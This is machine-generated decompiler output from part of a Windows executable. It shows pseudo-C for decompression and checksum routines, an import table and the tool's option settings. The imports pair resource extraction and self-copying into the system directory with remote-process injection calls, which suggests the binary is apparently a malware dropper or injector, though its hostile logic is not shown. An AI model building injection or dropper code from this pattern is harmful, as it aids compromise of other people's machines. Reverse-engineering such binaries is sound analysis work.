/*	Procedure: 0x00401DD0 - 0x00401E8E
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L00401DD0()
{
	/* unknown */ void  esi;



    esi = 0x403140;
    eax = 4207648;
    L00401850();
    *L00403120 = 0;
    eax = 0;
    do {
        ecx = eax >> 2;
        *(eax + 0x403124) = cl;
        eax = eax + 1;
    } while(eax < 26);
    edx = 3;
    eax = 0;
    do {
        cl = *(eax + 0x403120);
        *(eax * 2 + 4207584) = dx;
        edx = edx + (1 << cl);
        eax = eax + 1;
    } while(eax < 30);
    *L00403100 = 0;
    eax = 0;
    do {
        edx = eax >> 1;
        *(eax + 0x403102) = dl;
        eax = eax + 1;
    } while(eax < 28);
    edx = 1;
    eax = 0;
    do {
        cl = *(eax + 0x403100);
        *(eax * 2 + 4207520) = dx;
        edx = edx + (1 << cl);
        eax = eax + 1;
    } while(eax < 30);
    *L0040313C = 0;
    *L00403418 = 258;
}

/*	Procedure: 0x00401E8F - 0x00401E8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401E8F()
{



    asm("int3");
}

/*	Procedure: 0x00401E90 - 0x00401F89
 *	Argument size: 12
 *	Local size: 1236
 *	Save regs size: 0
 */

L00401E90(A4d8, A4dc, A4e0)
/* unknown */ void  A4d8;
/* unknown */ void  A4dc;
/* unknown */ void  A4e0;
{
	/* unknown */ void  V0;
	/* unknown */ void  V4;
	/* unknown */ void  V8;
	/* unknown */ void  Vc;
	/* unknown */ void  V10;
	/* unknown */ void  V14;
	/* unknown */ void  V274;



    *esp = A4e0;
    (save)ebx;
    Vc = A4d8;
    V10 = A4dc;
    *V10 = 0;
    for((save)esi; 1; ecx = V8) {
        eax = ecx;
        eax :: 0;
        if(V8 = ecx - 1) {
            eax = V4;
        } else {
            ecx = V0;
            eax = *ecx & 255;
            V0 = ecx + 1;
            V8 = 7;
        }
        esi = eax;
        eax = eax >> 1;
        ecx = 2;
        edx = & V0;
        V4 = eax;
        eax = L004019D0(0);
        if(esi = esi & 1) {
            eax = & V0;
            eax = L00401D60();
        } else {
            if(eax = eax - 1) {
                ebx = 0x403140;
                eax = & V0;
                eax = L00401C90(4207648);
            } else {
                if(eax = eax - 1) {
                    break;
                }
                L00401AB0( & V0, & V14, & V274);
                ebx = & V274;
                eax = & V0;
                eax = L00401C90( & V14);
            }
        }
        if(eax != 0) {
            break;
        }
        if(esi != 0) {
            goto L00401f7f;
        }
    }
    (restore)esi;
    (restore)ebx;
    return(-3);
L00401f7f:
    (restore)esi;
    (restore)ebx;
    esp = esp + 1236;
    return(0);
}

/*	Procedure: 0x00401F8A - 0x00401F8F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401F8A()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401F90 - 0x00401FE2
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401F90(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    eax = eax | -1;
    if(A8 == 0) {
        return(0);
    }
    ecx = 0;
    if(A8 > 0) {
        (save)ebx;
        (save)A4;
        (save)edi;
        do {
            eax = eax ^ *(ecx + A4) & 255;
            ebx = *((eax & 15) * 4 + 4202800);
            eax = eax >> 4 ^ ebx;
            ebx = *((eax & 15) * 4 + 4202800);
            eax = eax >> 4 ^ ebx;
            ecx = ecx + 1;
        } while(ecx < A8);
        (restore)edi;
        (restore)A4;
        (restore)ebx;
    }
    return(!eax);
}

/*	Procedure: 0x00401FE3 - 0x00401FFF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401FE3()
{



    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* address  size  */
/* 0x004015a4       0 */ /* unknown */ void 	__entry_point__;
/* 0x00402000       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00402004       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x00402008       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x0040200c       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x00402010       0 */ /* unknown */ void 	__imp__LockResource;
/* 0x00402014       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x00402018       0 */ /* unknown */ void 	__imp__FindResourceA;
/* 0x0040201c       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00402020       0 */ /* unknown */ void 	__imp__CreateRemoteThread;
/* 0x00402024       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00402028       0 */ /* unknown */ void 	__imp__WriteProcessMemory;
/* 0x0040202c       0 */ /* unknown */ void 	__imp__VirtualAllocEx;
/* 0x00402030       0 */ /* unknown */ void 	__imp__OpenProcess;
/* 0x00402034       0 */ /* unknown */ void 	__imp__CopyFileA;
/* 0x00402038       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x0040203c       0 */ /* unknown */ void 	__imp__SetFileAttributesA;
/* 0x00402040       0 */ /* unknown */ void 	__imp__GetSystemDirectoryA;
/* 0x00402044       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x00402048       0 */ /* unknown */ void 	__imp__HeapReAlloc;
/* 0x0040204c       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x00402050       0 */ /* unknown */ void 	__imp__GetStartupInfoA;
/* 0x00402054       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00402058       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x0040205c       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x00402064       0 */ /* unknown */ void 	__imp__SHGetPathFromIDListA;
/* 0x00402068       0 */ /* unknown */ void 	__imp__ShellExecuteA;
/* 0x0040206c       0 */ /* unknown */ void 	__imp__SHGetSpecialFolderLocation;
/* 0x00402074       0 */ /* unknown */ void 	__imp__GetWindowThreadProcessId;
/* 0x00402078       0 */ /* unknown */ void 	__imp__GetForegroundWindow;
/* 0x0040207c       0 */ /* unknown */ void 	__imp__IsWindow;
/* 0x00402080       0 */ /* unknown */ void 	__imp__FindWindowA;
/* 0x00402088       0 */ /* unknown */ void 	__imp__CoTaskMemFree;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
